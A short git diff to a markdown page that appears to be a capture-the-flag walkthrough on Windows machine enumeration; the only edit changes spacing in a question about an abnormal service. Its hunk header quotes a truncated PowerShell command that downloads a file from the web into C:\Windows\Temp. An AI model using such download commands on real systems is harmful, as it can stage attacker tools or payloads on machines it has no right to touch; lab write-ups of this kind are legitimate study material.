@@ -96,7 +96,7 @@ cd C:\Windows\Temp powershell "(New-Object System.Net.WebClient).Downloadfile('h
 
 <figure><img src="../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
-**Further enumerate the machine. What is the name of the abnormal **_**service**_** running?**
+**Further enumerate the machine. What is the name of the abnormal&#x20;**_**service**_**&#x20;running?**
 
 
 
